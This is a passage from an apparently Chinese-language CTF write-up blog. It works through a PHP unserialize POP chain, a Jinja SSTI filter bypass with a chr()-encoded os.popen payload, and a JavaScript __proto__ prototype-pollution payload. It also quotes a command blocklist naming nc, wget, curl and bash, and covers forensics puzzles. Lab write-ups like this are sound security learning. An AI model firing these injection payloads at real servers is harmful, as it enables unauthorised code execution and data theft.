class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$qwejaskdjnlka</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\>|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"alright"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">qwejaskdjnlka</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//wanna try?</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>本题就如类名<code>minipop</code>，小型pop链，我们需要构造一个仅能含有以下字符的代码，并且也不能用以上涉及到的命令，并且其能被<code>exec</code>执行，但是本题由于<code>return &quot;alright&quot;;</code>会导致不会返回我们输出代码所造成的结果</p><pre><code> &quot;&#39;()+,-/:;=ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]_`abcdefghijklmnopqrstuvwxyz|~</code></pre><p>所以我们就需要像第一题那样，既然这个页面不显示那我就让它出的结果去另一个页面，我们先构造这个payload</p><pre><code>&lt;?phphighlight_file(__FILE__);class minipop&#123;    public $code=&quot;ls /|te&#39;&#39;e /var/www/html/1&quot;;    public $qwejaskdjnlka;    public function __toString()    &#123;    &#125;    public function __destruct()    &#123;    &#125;&#125;$a = new minipop();$a -&gt;qwejaskdjnlka = $a;echo serialize($a);</code></pre><pre><code>POST: payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:26:&quot;ls /|te&#39;&#39;e /var/www/html/1&quot;;s:13:&quot;qwejaskdjnlka&quot;;r:1;&#125;</code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222208988.png"></p><pre><code>POST: payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:42:&quot;cat /flag_is_h3eeere|te&#39;&#39;e /var/www/html/2&quot;;s:13:&quot;qwejaskdjnlka&quot;;r:1;&#125;</code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222211818.png"></p><h3 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h3><p>页面啥都没有，就让我们找找信息，通过御剑可以扫描到后台有一个jsp源码泄露</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222225708.png"></p><p>用BP打开可以看到提示，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222228373.png"></p><p>进去看看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222230125.png"></p><p>说让我们传点参进去，通过尝试发现传的参会被回显出来</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222232372.png"></p><p>通过后面看大佬wp复现知道这里的考点是SSTI注入，并且发现其中是有过滤的</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222233329.png"></p><p>所以我们修改一下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222234828.png"></p><pre class=" language-javascript"><code class="language-javascript">GET：name<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">%</span>print<span class="token string">""</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__base__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__subclasses__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span></code></pre><p>可以通过该段代码查看子类</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222244651.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222244197.png"></p><p>可以找到可利用模块</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222245202.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222246890.png"></p><p>所以我们也可以进行__init__进行初始化类，再通过调用globals获取到以字典的形式返回的方法、属性等值。init被过滤，我们可以通过”+”来进行拼接绕过。</p><pre class=" language-javascript"><code class="language-javascript">GET<span class="token punctuation">:</span> name<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">%</span>print<span class="token string">""</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__base__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__subclasses__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__in"</span><span class="token operator">+</span><span class="token string">"it__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__globals__"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222249717.png"></p><p>可以看到<code>eval</code>和<code>exec</code>等命令执行函数，popen被过滤，我们可以通过<code>chr()函数</code>来绕过，通过构造<code>eval(__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read())</code>来构造。</p><p>所以构造最终的payload</p><pre class=" language-javascript"><code class="language-javascript">GET<span class="token punctuation">:</span>  name<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">%</span>print<span class="token string">""</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__base__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__subclasses__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__in"</span><span class="token operator">+</span><span class="token string">"it__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"__globals__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"__builtins__"</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403222250966.png"></p><h3 id="OtenkiGirl-JavaScript-原型链污染（-proto-）"><a href="#OtenkiGirl-JavaScript-原型链污染（-proto-）" class="headerlink" title="OtenkiGirl(JavaScript 原型链污染（_proto_）)"></a>OtenkiGirl(<code>JavaScript 原型链污染（</code>_<em>proto</em>_<code>）</code>)</h3><p>   本题的主要考点是<code>JS原型链污染</code>，这次复现算是第一次实际了解了，即是利用<code>JS语言</code>的原型继承的特性。当我用JS语言定义一个类并赋予它属性的时候，它除了赋予的属性，还会有一个prototype的属性。prototype指向函数的原型对象，这是一个显式原型属性，只有函数才拥有该属性。同时，prototype也拥有两个属性：constructor：指向原型的构造函数和prototype:指向了Object的原型。即每个对象都有一个原型(<code>prototype</code>)，然后每一个对象通过这个指向其的原型(<code>prototype</code>)的链接，通过这个链接可以实现属性与方法的继承。</p><p>   当我们访问一个对象的属性或方法时，如果该对象本身没有定义该属性或方法，JavaScript引擎会自动在原型对象中查找。如果原型对象中也不存在，则继续在原型链上的上层原型对象中查找，直到找到该属性或方法或达到原型链的顶端为止。而访问所要用到的，就是<code>__proto__</code>，即实例化的对象可以用<code>__proto__</code>来访问对象所在类的prototype属性。我们通过修改实例化对象的<code>__proto__</code>中的值，污染了类本体，进而影响所有和这个对象来自同一个类、父祖类的对象。即通过篡改JavaScript中的原型对象，将恶意代码注入到原型中，当其他对象通过原型链继承了被污染的原型对象时，它们也会受到影响，从而导致意外的行为或数据泄露。</p><p>首先我们可以在题目下载本题的源码</p><pre class=" language-JS"><code class="language-JS">const env = global.env = (process.env.NODE_ENV || "production").trim();const isEnvDev = global.isEnvDev = env === "development";const devOnly = (fn) => isEnvDev ? (typeof fn === "function" ? fn() : fn) : undefinedconst CONFIG = require("./config"), DEFAULT_CONFIG = require("./config.default");const PORT = CONFIG.server_port || DEFAULT_CONFIG.server_port;const path = require("path");const Koa = require("koa");const bodyParser = require("koa-bodyparser");const app = new Koa();app.use(require('koa-static')(path.join(__dirname, './static')));devOnly(_ => require("./webpack.proxies.dev").forEach(p => app.use(p)));app.use(bodyParser({    onerror: function (err, ctx) {        // If the json is invalid, the body will be set to {}. That means, the request json would be seen as empty.        if (err.status === 400 && err.name === 'SyntaxError' && ctx.request.type === 'application/json') {            ctx.request.body = {}        } else {            throw err;        }    }}));[    "info",    "submit"].forEach(p => { p = require("./routes/" + p); app.use(p.routes()).use(p.allowedMethods()) });app.listen(PORT, () => {    console.info(`Server is running at port ${PORT}...`);})module.exports = app;</code></pre><p>首先在第四行代码中告诉我们引入了俩个配置文件，分别是<code>config</code>和<code>config.default</code>。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> CONFIG <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./config"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> DEFAULT_CONFIG <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./config.default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后在第二十四行代码告诉我们引入了<code>routes</code>两个文件夹，分别是<code>info</code>和<code>submit</code>。</p><pre class=" language-js"><code class="language-js"><span class="token punctuation">[</span>    <span class="token string">"info"</span><span class="token punctuation">,</span>    <span class="token string">"submit"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>p <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> p <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./routes/"</span> <span class="token operator">+</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>通过<code>forEach函数</code>遍历字符串数组[“info”,”submit”]，对于数组中的每个元素 <code>p</code>，利用 <code>require</code> 函数将位于 <code>&quot;./routes/&quot; + p</code> 的文件导入。这表示 <code>routes</code> 文件夹下的 <code>info.js</code> 和 <code>submit.js</code> 文件会被导入到代码中。</p><p>所以我们可以以此去看看 <code>info.js</code> 和 <code>submit.js</code> 文件中的内容</p><pre class=" language-JS"><code class="language-JS">info.jsconst Router = require("koa-router");const router = new Router();const SQL = require("./sql");const sql = new SQL("wishes");const CONFIG = require("../config")const DEFAULT_CONFIG = require("../config.default")async function getInfo(timestamp) {    timestamp = typeof timestamp === "number" ? timestamp : Date.now();    // Remove test data from before the movie was released    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();    timestamp = Math.max(timestamp, minTimestamp);    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });    return data;}router.post("/info/:ts?", async (ctx) => {    if (ctx.header["content-type"] !== "application/x-www-form-urlencoded")        return ctx.body = {            status: "error",            msg: "Content-Type must be application/x-www-form-urlencoded"        }    if (typeof ctx.params.ts === "undefined") ctx.params.ts = 0    const timestamp = /^[0-9]+$/.test(ctx.params.ts || "") ? Number(ctx.params.ts) : ctx.params.ts;    if (typeof timestamp !== "number")        return ctx.body = {            status: "error",            msg: "Invalid parameter ts"        }    try {        const data = await getInfo(timestamp).catch(e => { throw e });        ctx.body = {            status: "success",            data: data        }    } catch (e) {        console.error(e);        return ctx.body = {            status: "error",            msg: "Internal Server Error"        }    }})module.exports = router;</code></pre><p>我们可以在其中发现该代码</p><pre class=" language-JS"><code class="language-JS">let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();</code></pre><p>使用<code>CONFIG</code>中的变量<code>min_public_time</code>，如果没有，就使用<code>DEFAULT_CONFIG</code>中的变量<code>min_public_time</code>。</p><p>所以我们继续追踪，可以去看看<code>config.js文件</code>和<code>config.default.js文件</code>，</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">/*config.js*/</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    app_name<span class="token punctuation">:</span> <span class="token string">"OtenkiGirl"</span><span class="token punctuation">,</span>    default_lang<span class="token punctuation">:</span> <span class="token string">"ja"</span><span class="token punctuation">,</span><span class="token punctuation">}</span></code></pre><p>发现在<code>config.js</code>文件内没有变量<code>min_public_time</code>，那我们只能去<code>config.default.js文件</code>看看了，</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">/*config.default.js*/</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    app_name<span class="token punctuation">:</span> <span class="token string">"OtenkiGirl"</span><span class="token punctuation">,</span>    default_lang<span class="token punctuation">:</span> <span class="token string">"ja"</span><span class="token punctuation">,</span>    min_public_time<span class="token punctuation">:</span> <span class="token string">"2019-07-09"</span><span class="token punctuation">,</span>    server_port<span class="token punctuation">:</span> <span class="token number">9960</span><span class="token punctuation">,</span>    webpack_dev_port<span class="token punctuation">:</span> <span class="token number">9970</span><span class="token punctuation">}</span></code></pre><p>我们可以借助原型链污染变量<code>min_public_time</code>为更早的日期，从而达成绕过这个时间限制的目的，在这些文件都看完，我们再回头去看看<code>submit.js文件</code>，在第39行和第49行，我们可以找到这么一串代码</p><pre class=" language-JS"><code class="language-JS">const merge = (dst, src) => {    if (typeof dst !== "object" || typeof src !== "object") return dst;    for (let key in src) {        if (key in dst && key in src) {            dst[key] = merge(dst[key], src[key]);        } else {            dst[key] = src[key];        }    }    return dst;}</code></pre><p>即如果<code>key</code>既存在于<code>dst对象</code>中，又存在于<code>src对象</code>中，则会递归调用<code>merge函数</code>将两者进行合并，否则<code>dst[key]</code>会被赋值为<code>src[key]</code>。这意味着如果<code>src对象</code>的原型链上存在名为<code>&#39;min_public_time&#39;</code>的属性，则该属性将被赋值给<code>dst对象</code>，那么<code>dst[key]</code>将会指向原型链上的值。在JavaScript中，对象可以具有特殊的属性<code>__proto__</code>，它指向对象的原型。通过修改<code>data[&#39;__proto__&#39;][&#39;min_public_time&#39;]</code>的值，我们可以影响原型链上的属性。</p><p>所以我们可以构造</p><pre><code>&#123;&quot;date&quot;:&quot;1&quot;,&quot;place&quot;:&quot;1&quot;,&quot;contact&quot;:&quot;123&quot;,&quot;reason&quot;:&quot;467&quot;,&quot;__proto__&quot;:&#123;&quot;min_public_time&quot;:&quot; 1001-01-01&quot;&#125;&#125;</code></pre><p>然后回显出来的wishid值保留</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403242358400.png"></p><p>然后清除浏览器中的cookie值会话储存都清空，然后在会话储存中写入<code>key</code>和<code>value</code></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403242359824.png"></p><p>刷新页面，如果出现了其他的祈愿条则说明成功</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403250000514.png"></p><p>然后在御坂美琴这条通过检查里面内容信息，可以看到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403250001250.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="阳光开朗大男孩"><a href="#阳光开朗大男孩" class="headerlink" title="阳光开朗大男孩"></a>阳光开朗大男孩</h3><p>打开文件可以拿到俩个txt文件，一个是flag.txt，一个是secret.txt，俩者的内容分别是</p><pre><code>flag.txt🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🌊⏩🔬🚹✉☀☺🚹🐅🎤🛩💵🌿🌊🚰😊🌊✉🐎❓🎈🌉👑🎅📮🥋👣🕹🚪☀🔄🚫🐍❓🐍😊☀🔬🍍🤣🎈🥋🙃👑🌏🐎🌊📮😂💵🏹👉❓😇🍴💧☺💵😁☃👉🎅👁☂🌿👉🍴🌪👌🍴🍵🖐😇🍍😀🗒🗒</code></pre><pre><code>secret.txt法治自由公正爱国公正敬业法治和谐平等友善敬业法治富强公正民主法治和谐法治和谐法治法治公正友善敬业法治文明公正自由平等诚信平等公正敬业法治和谐平等友善敬业法治和谐和谐富强和谐富强和谐富强平等友善敬业公正爱国和谐自由法治文明公正自由平等友善敬业法治富强和谐自由法治和谐法治和谐法治和谐法治法治和谐富强法治文明公正自由公正自由公正自由公正自由</code></pre><p>secret.txt内容一眼可以看出是核心价值观编码，放到解密网站看看</p><p>可以解密出<code>this_password_is_s000_h4rd_p4sssw0rdddd</code>，结合flag.txt内容是emoji，猜测为Emoji AES解密<a href="https://ruotian.io/2020/02/emoji-aes/">🔒 Emoji AES | Ruotian’s I&#x2F;O</a>，经解密可以拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403272133375.png"></p><h3 id="大怨种"><a href="#大怨种" class="headerlink" title="大怨种"></a>大怨种</h3><p>下载文件是一张<code>gif图</code>，通过截帧可以拿到一个<code>码</code>，但是不知道是哪个码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403272136966.png"></p><p>放到该网站里面扫一扫发现是<code>HANXIN码</code></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403272137141.png"></p><pre><code>其中的内容是666C61677B315F64306E745F6B306E775F6830775F746F5F7363346E5F746831735F633064335F61cef808a868e&#125;</code></pre><p>把前面一段十六进制转ascii，结合起来就是flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403272139053.png"></p><pre><code>flag&#123;1_d0nt_k0nw_h0w_to_sc4n_th1s_c0d3_acef808a868e&#125;</code></pre><h3 id="2-分析"><a href="#2-分析" class="headerlink" title="2-分析"></a>2-分析</h3><pre><code>题目备注但你心中仍然有一种不祥的预感，这时你的同事告诉你这台服务器已经被攻击者获取到了权限，需要你尽快去还原攻击者的攻击路径，调查清楚攻击者是如何获取到服务器权限的。；FLAG格式flag&#123;md5(攻击者登录使用的用户名_存在漏洞的文件名_WebShell文件名)&#125;；例如flag&#123;testuser_123.php_shell.php&#125;，将括号内的内容进行md5编码得到flag&#123;58aec571c731faae1369b461d3927596&#125;即为需要提交的Flag</code></pre><p>先通过 <code>http.request.method==POST</code>过滤到攻击成功的包，从<code>login.php</code>中可以找到攻击者登陆的用户名</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403282032678.png"></p><pre><code>username=best_admin</code></pre><p>搜索<code>&lt;?</code>关键词，我们可以找到该流量</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403282043984.png"></p><p>一下解决了俩个问题，即<code>存在漏洞的文件名</code>和<code>WebShell文件名</code>，前者是<code>index.php</code>，后者则是<code>wh1t3g0d.php</code></p><p>结合起来可以构造</p><pre><code>best_admin_index.php_wh1t3g0d.php</code></pre><p>对其进行md5加密即可</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403282046095.png"></p><p>最终可得<code>flag&#123;4069afd7089f7363198d899385ad688b&#125;</code></p><h3 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h3><p>打开压缩文件还是一个流量包，里面是<code>USB流量</code>，先通过过滤拿到相关键盘流量</p><pre><code>usb.src ==&quot;1.15.1&quot;</code></pre><p>然后将上述过滤出来的键盘流量导出来为<code>1.pcapng</code>，再通过tshark命令对上述流量数据进行提取并去除空行并生成txt文件</p><pre><code>tshark -r res.pcapng -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></pre><p>然后通过python脚本进行按键信息对比提取</p><pre class=" language-python"><code class="language-python">normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span 